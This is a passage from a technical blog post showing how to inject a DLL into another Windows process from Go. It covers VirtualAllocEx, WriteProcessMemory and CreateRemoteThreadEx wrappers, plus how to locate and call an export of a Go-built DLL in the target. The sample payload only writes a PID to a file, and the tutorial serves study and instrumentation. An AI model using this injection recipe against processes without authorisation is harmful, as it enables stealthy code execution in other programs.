</span></span></code></pre></div><p>We specify the required parameters to the Call function, the process handle, the allocation size and the protection flags, we default the allocation address to 0 since we leave the task to choose an address for the mapping to the OS. Notice that we do not check directly for error, but instead we check if the addr is equal to 0. We do this because the return from VirtualAllocEx is NULL in case of error, and one should later check about the error code calling GetLastError Windows API. The LazyProc.Call combines this behavior, so we return err just in case addr == 0. Since all the wrappers we’re going to write are implemented in the same way, I’m not going to repeat this concept further.</p>
<p>In order to invoke our wrapper we do:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#75715e">// flags for VirtualAllocEx
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">allocType</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">windows</span>.<span style="color:#a6e22e">MEM_RESERVE</span> | <span style="color:#a6e22e">windows</span>.<span style="color:#a6e22e">MEM_COMMIT</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">allocProt</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">windows</span>.<span style="color:#a6e22e">PAGE_READWRITE</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">size</span> <span style="color:#f92672">:=</span> <span style="color:#ae81ff">4096</span>
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span><span style="color:#75715e">// alloc virtual memory into remote process and grab the address
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">addr</span>, <span style="color:#a6e22e">_</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">VirtualAllocEx</span>(<span style="color:#a6e22e">pHandle</span>, uintptr(<span style="color:#a6e22e">size</span>), uintptr(<span style="color:#a6e22e">allocType</span>), uintptr(<span style="color:#a6e22e">allocProt</span>))
</span></span></code></pre></div><p>We ask the OS to directly commit the memory (despite this will not allocate it, because memory will be allocated on the first access). We also specify READ/WRITE permissions and a size of 4K (specifying less won’t actually make sense since VirtualAllocEx will anyway default to a page boundary allocation). If the call succeeds we get back the address of the allocated memory into the remote process (this means that this address is valid just into the VAD of another process, and can’t be accessed directly from our process through e.g. a dereference).</p>
<p>Now we can write the DLL path into the remote process memory, but in order to accomplish it we need to invoke the WriteProcessMemory function. We need to write a wrapper for it too since not directly available into the Go package.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#75715e">// resolve the windows.LazyProc object
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">writeProcessMemory</span>   = <span style="color:#a6e22e">kernel32</span>.<span style="color:#a6e22e">NewProc</span>(<span style="color:#e6db74">&#34;WriteProcessMemory&#34;</span>)
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span><span style="color:#75715e">// WriteProcessMemory wrapper
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">WriteProcessMemory</span>(<span style="color:#a6e22e">pHandle</span> <span style="color:#a6e22e">windows</span>.<span style="color:#a6e22e">Handle</span>, <span style="color:#a6e22e">addr</span> <span style="color:#66d9ef">uintptr</span>, <span style="color:#a6e22e">path</span> <span style="color:#f92672">*</span><span style="color:#66d9ef">byte</span>, <span style="color:#a6e22e">len</span> <span style="color:#66d9ef">uintptr</span>) (<span style="color:#a6e22e">ret</span> <span style="color:#66d9ef">uintptr</span>, <span style="color:#a6e22e">err</span> <span style="color:#66d9ef">error</span>) {
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// write DLL path into remote process memory
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">ret</span>, <span style="color:#a6e22e">_</span>, <span style="color:#a6e22e">err</span> = <span style="color:#a6e22e">writeProcessMemory</span>.<span style="color:#a6e22e">Call</span>(
</span></span><span style="display:flex;"><span>        uintptr(<span style="color:#a6e22e">pHandle</span>),                      <span style="color:#75715e">// process handle
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        uintptr(<span style="color:#a6e22e">addr</span>),                         <span style="color:#75715e">// remote process address
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        uintptr(<span style="color:#a6e22e">unsafe</span>.<span style="color:#a6e22e">Pointer</span>(<span style="color:#a6e22e">path</span>)),         <span style="color:#75715e">// buffer to write
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        uintptr(<span style="color:#a6e22e">len</span>),                          <span style="color:#75715e">// length of the buffer
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        uintptr(<span style="color:#ae81ff">0</span>)) <span style="color:#75715e">// bytes actually written (we set it to NULL)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> 
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">ret</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">err</span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">ret</span>, <span style="color:#66d9ef">nil</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>We pass the process handle, the address into the remote process VAD, the buffer we are going to write and its length. We set to NULL the number of bytes written return variable (since we’re not interested in).</p>
<p>We can now invoke it:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#75715e">// convert string to pointer of bytes
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">pathBytes</span>, <span style="color:#a6e22e">_</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">windows</span>.<span style="color:#a6e22e">BytePtrFromString</span>(<span style="color:#a6e22e">dllPath</span>)
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span><span style="color:#75715e">// write DLL path to remote process memory
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">retWrite</span>, <span style="color:#a6e22e">_</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">WriteProcessMemory</span>(<span style="color:#a6e22e">pHandle</span>, <span style="color:#a6e22e">addr</span>, <span style="color:#a6e22e">pathBytes</span>, uintptr(len(<span style="color:#a6e22e">dllPath</span>)))
</span></span></code></pre></div><p>WriteProcessMemory receives a pointer and we cannot of course pass a Go string we need a way to translate it to a *byte pointer. Luckily for us the package as BytePtrFromString facility which accomplishes the job.</p>
<p>Now the last piece of the puzzle. We need to start a remote thread into the target process that will call LoadLibraryA(addressOfDLLPath). Another wrapper is necessary:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#75715e">// grab the LazyProc related to CreateRemoteThread
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">createRemoteThreadEx</span> = <span style="color:#a6e22e">kernel32</span>.<span style="color:#a6e22e">NewProc</span>(<span style="color:#e6db74">&#34;CreateRemoteThreadEx&#34;</span>)
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span><span style="color:#75715e">// CreateRemoteThreadEx wrapper
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">CreateRemoteThreadEx</span>(<span style="color:#a6e22e">pHandle</span> <span style="color:#a6e22e">windows</span>.<span style="color:#a6e22e">Handle</span>, <span style="color:#a6e22e">remoteProcAddr</span>, <span style="color:#a6e22e">argAddr</span> <span style="color:#66d9ef">uintptr</span>) (<span style="color:#a6e22e">handle</span> <span style="color:#66d9ef">uintptr</span>, <span style="color:#a6e22e">err</span> <span style="color:#66d9ef">error</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// create a remote thread into the targeted process
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">handle</span>, <span style="color:#a6e22e">_</span>, <span style="color:#a6e22e">err</span> = <span style="color:#a6e22e">createRemoteThreadEx</span>.<span style="color:#a6e22e">Call</span>(
</span></span><span style="display:flex;"><span>        uintptr(<span style="color:#a6e22e">pHandle</span>), <span style="color:#75715e">// process
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        uintptr(<span style="color:#ae81ff">0</span>),       <span style="color:#75715e">// security attributes NULL
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        uintptr(<span style="color:#ae81ff">0</span>),       <span style="color:#75715e">// 0 means stack size will be the default based on binary attributes
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">remoteProcAddr</span>,   <span style="color:#75715e">// address of the entry point for this thread
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">argAddr</span>,          <span style="color:#75715e">// address of the argument to the entry point function in this case &#34;LoadLibraryA(ourDllPAth)&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        uintptr(<span style="color:#ae81ff">0</span>),       <span style="color:#75715e">// thread creations flag default none, it starts executing
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        uintptr(<span style="color:#ae81ff">0</span>),       <span style="color:#75715e">// pointer to returned threadID, we don&#39;t need it
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    )
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">handle</span>, <span style="color:#a6e22e">err</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>OK, we just now need to invoke it:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#75715e">// call LoadLibraryA(dllPath)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">remThreadHandle</span>, <span style="color:#a6e22e">_</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">CreateRemoteThreadEx</span>(<span style="color:#a6e22e">pHandle</span>, <span style="color:#a6e22e">loadLibraryA</span>.<span style="color:#a6e22e">Addr</span>(), <span style="color:#a6e22e">addr</span>)
</span></span></code></pre></div><p>So this was the recipe to inject a DLL in Go in Windows process, it is identical to what one would have done for example in C, except we’re using Go abstractions and the x/sys/windows package.</p>
<h3 id="injecting-a-dll-written-in-go">Injecting a DLL written in Go:</h3>
<p>What we’ve assumed into the previous part of the post is that we’re injecting a DLL written in C/C++ or any other language which supports writing DLLs and that provides a DllMain function implemented. When a DLL gets loaded or unloaded, the DllMain gets invoked and should check the reason of its invocation, the next snippet of code should be self explanatory:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>BOOL WINAPI <span style="color:#a6e22e">DllMain</span>(
</span></span><span style="display:flex;"><span>    HINSTANCE hinstDLL,  <span style="color:#75715e">// handle to DLL module
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    DWORD fdwReason,     <span style="color:#75715e">// reason for calling function
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    LPVOID lpReserved )  <span style="color:#75715e">// reserved
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>{
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Perform actions based on the reason for calling.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">switch</span>( fdwReason ) 
</span></span><span style="display:flex;"><span>    { 
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> DLL_PROCESS_ATTACH:
</span></span><span style="display:flex;"><span>         <span style="color:#75715e">// Initialize once for each new process.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>         <span style="color:#75715e">// Return FALSE to fail DLL load.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> DLL_THREAD_ATTACH:
</span></span><span style="display:flex;"><span>         <span style="color:#75715e">// Do thread-specific initialization.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> DLL_THREAD_DETACH:
</span></span><span style="display:flex;"><span>         <span style="color:#75715e">// Do thread-specific cleanup.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> DLL_PROCESS_DETACH:
</span></span><span style="display:flex;"><span>         <span style="color:#75715e">// Perform any necessary cleanup.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> TRUE;  <span style="color:#75715e">// Successful DLL_PROCESS_ATTACH.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>}
</span></span></code></pre></div><p>So basically whoever has implemented a DLL in a standard way can relay on the fact that as soon it gets loaded into the process the DllMain will give a chance to do something (benign or malicious intents).</p>
<p>Unfortunately writing a DLL in Go will not produce the same effect, and if we compile a Go binary as a c-shared library, when loaded into the remote process it will just sticks there in memory doing nothing… Unless the target process does not call directly on some exported function. Let’s make an example:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#f92672">package</span> <span style="color:#a6e22e">main</span>
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> (
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;fmt&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;os&#34;</span>
</span></span><span style="display:flex;"><span>)
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> <span style="color:#e6db74">&#34;C&#34;</span>
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span><span style="color:#75715e">//export Init
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">Init</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">pid</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">os</span>.<span style="color:#a6e22e">Getpid</span>()
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">f</span>, <span style="color:#a6e22e">_</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">os</span>.<span style="color:#a6e22e">Create</span>(<span style="color:#e6db74">&#34;C:\\Users\\SomeUser\\Desktop\\test.txt&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">defer</span> <span style="color:#a6e22e">f</span>.<span style="color:#a6e22e">Close</span>()
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">f</span>.<span style="color:#a6e22e">WriteString</span>(<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Sprintf</span>(<span style="color:#e6db74">&#34;PID: %d\n&#34;</span>, <span style="color:#a6e22e">pid</span>))
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>This Go code exports a function called Init that will just write its PID into a file on the Desktop of SomeUser. The main function is empty, and this is for a reason: when we are going to compile a Go binary as a DLL its main function will never be called. And that’s obvious because as we said before the Windows loader will invoke something called DllMain. Let’s see if such function exists in a Go DLL binary and if there let’s examine what it does (notice that we need to specify the CC compiler variable in order to build a Go DLL on Windows, it actually just works with the mingw one):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>CC<span style="color:#f92672">=</span>x86_64-w64-mingw32-gcc go build -o some.dll -buildmode<span style="color:#f92672">=</span>c-shared some.go
</span></span></code></pre></div><p><img src="/dll_inject_go.webp" alt="injection"></p>
<p>When the DLL gets loaded its DllMain returns just TRUE. So its obvious that we need to find a way to tell the remote process it has to invoke something, e.g. our Init function.</p>
<p>Theoretically we could just do the same thing we did in order to invoke the LoadLibraryA function using CreateRemoteThreadEx and giving it the address of Init. But fact is that for non system DLLs it can happen that they reside at some different addresses, in fact in case the VAD portion of a process the DLL would like to be loaded is already occupied, so the loader will fix and relocate it elsewhere into the target memory process. So, we need to understand where the DLL has been loaded and and where the Init function address resides. But how?</p>
<p>Windows comes with a nice APIs to grab information about processes, loaded DLLs and heap memory status, this is the Tool Help Library. We’re also lucky enough because this set of APIs has been already wrapped into the x/sys/windows package.</p>
<p>So in order to get where the DLL we just loaded resides into the remote process VAD we can use the following code:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#75715e">// SearchModuleAddr returns the base address of a module
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">SearchModuleAddr</span>(<span style="color:#a6e22e">searchDLL</span> <span style="color:#66d9ef">string</span>, <span style="color:#a6e22e">pid</span> <span style="color:#66d9ef">uint32</span>) (<span style="color:#a6e22e">addr</span> <span style="color:#66d9ef">uintptr</span>, <span style="color:#a6e22e">size</span> <span style="color:#66d9ef">uint32</span>, <span style="color:#a6e22e">err</span> <span style="color:#66d9ef">error</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// create a snapshot
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">handle</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">windows</span>.<span style="color:#a6e22e">CreateToolhelp32Snapshot</span>(<span style="color:#a6e22e">windows</span>.<span style="color:#a6e22e">TH32CS_SNAPMODULE</span>, <span style="color:#a6e22e">pid</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Errorf</span>(<span style="color:#e6db74">&#34;failed to create snapshot: %s&#34;</span>, <span style="color:#a6e22e">err</span>.<span style="color:#a6e22e">Error</span>())
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// setup the entry with its own size
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">entry</span> <span style="color:#a6e22e">windows</span>.<span style="color:#a6e22e">ModuleEntry32</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">entry</span>.<span style="color:#a6e22e">Size</span> = uint32(<span style="color:#a6e22e">windows</span>.<span style="color:#a6e22e">SizeofModuleEntry32</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// get first entry
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">err</span> = <span style="color:#a6e22e">windows</span>.<span style="color:#a6e22e">Module32First</span>(<span style="color:#a6e22e">handle</span>, <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">entry</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Errorf</span>(<span style="color:#e6db74">&#34;failed to get first module: %s&#34;</span>, <span style="color:#a6e22e">err</span>.<span style="color:#a6e22e">Error</span>())
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// parse the exepath to a Unicode string
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">dllName</span> <span style="color:#a6e22e">windows</span>.<span style="color:#a6e22e">NTUnicodeString</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">windows</span>.<span style="color:#a6e22e">RtlInitUnicodeString</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">dllName</span>, <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">entry</span>.<span style="color:#a6e22e">ExePath</span>[<span style="color:#ae81ff">0</span>])
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// transform into Go string and get the DLL name
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">dllNameS</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">filepath</span>.<span style="color:#a6e22e">Base</span>(<span style="color:#a6e22e">dllName</span>.<span style="color:#a6e22e">String</span>())
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// check if it&#39;s the one we&#39;re looking for
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">dllNameS</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">searchDLL</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">addr</span> = <span style="color:#a6e22e">entry</span>.<span style="color:#a6e22e">ModBaseAddr</span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">size</span> = <span style="color:#a6e22e">entry</span>.<span style="color:#a6e22e">ModBaseSize</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">err</span> = <span style="color:#a6e22e">windows</span>.<span style="color:#a6e22e">Module32Next</span>(<span style="color:#a6e22e">handle</span>, <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">entry</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">addr</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Errorf</span>(<span style="color:#e6db74">&#34;unable to retrieve: %s library&#34;</span>, <span style="color:#a6e22e">searchDLL</span>)
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">addr</span>, <span style="color:#a6e22e">size</span>, <span style="color:#66d9ef">nil</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>This function receives as an input a DLL name and a PID, then it creates a snapshot of loaded modules for the given process and iterates over them. If we find a DLL which name is equal to the one we provided it returns its address and size, otherwise returns an error.</p>
<p>Once we’ve the address of the DLL we need to understand where the Init function is located. So we’ve two possibilities at this point:</p>
<ul>
<li>we can load the DLL into our own process and compare the address with the one of the remote process (there’s chance has not been relocated) and if they match we can easily grab the address of Init with GetProcAddr and pass it directly to CreateRemoteThreadEx</li>
<li>we inspect the Export Table of the DLL, and locate the RVA (relative virtual address) of the Init function and then we add it to the in memory base image address of the DLL</li>
</ul>
<p>So here a snippet of code:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#a6e22e">rva</span>, <span style="color:#a6e22e">_</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">SearchDLLFunctionAddr</span>(<span style="color:#a6e22e">dllPath</span>, <span style="color:#e6db74">&#34;Init&#34;</span>)
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span><span style="color:#75715e">// load DLL into our own process so we can resolve the Init symbol
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">dll</span>, <span style="color:#a6e22e">_</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">windows</span>.<span style="color:#a6e22e">LoadDLL</span>(<span style="color:#a6e22e">dllPath</span>)
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span><span style="color:#75715e">// get the Init function address
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">initFunc</span>, <span style="color:#a6e22e">_</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">dll</span>.<span style="color:#a6e22e">FindProc</span>(<span style="color:#e6db74">&#34;Init&#34;</span>)
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span><span style="color:#75715e">// search the module addr into remote process memory
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">dllAddr</span>, <span style="color:#a6e22e">_</span> , <span style="color:#a6e22e">_</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">SearchModuleAddr</span>(<span style="color:#a6e22e">filepath</span>.<span style="color:#a6e22e">Base</span>(<span style="color:#a6e22e">dllPath</span>), uint32(<span style="color:#a6e22e">pid</span>))
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span><span style="color:#75715e">// if DLLs got mapped both at the same address we can call Init function directly
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// with the address we resolved locally from loading DLL into our own process
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span> <span style="color:#a6e22e">dllAddr</span> <span style="color:#f92672">==</span> uintptr(<span style="color:#a6e22e">dll</span>.<span style="color:#a6e22e">Handle</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// invoke Init into remote process since we now have the address
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">remoteThreadInitCallHandle</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">CreateRemoteThreadEx</span>(<span style="color:#a6e22e">pHandle</span>, <span style="color:#a6e22e">initFunc</span>.<span style="color:#a6e22e">Addr</span>(), uintptr(<span style="color:#ae81ff">0</span>))
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// we sum the RVA to the remote DLL addr and create manually address for Init function
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">remoteAddr</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">dllAddr</span> <span style="color:#f92672">+</span> uintptr(<span style="color:#a6e22e">rva</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">remoteThreadInitCallHandle</span>, <span style="color:#a6e22e">_</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">CreateRemoteThreadEx</span>(<span style="color:#a6e22e">pHandle</span>, <span style="color:#a6e22e">remoteAddr</span>, uintptr(<span style="color:#ae81ff">0</span>))
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>What’s missing is how we get the RVA of the Init function into the DLL. I’ve accomplished the task using this really nice library which parses PE binaries.</p>
<p>And here is the code used:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#75715e">// SearchDLLFunctionAddr searches a function inside a DLL
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">SearchDLLFunctionAddr</span>(<span style="color:#a6e22e">dll</span>, <span style="color:#a6e22e">function</span> <span style="color:#66d9ef">string</span>) (<span style="color:#a6e22e">rva</span> <span style="color:#66d9ef">uint32</span>, <span style="color:#a6e22e">err</span> <span style="color:#66d9ef">error</span>) {
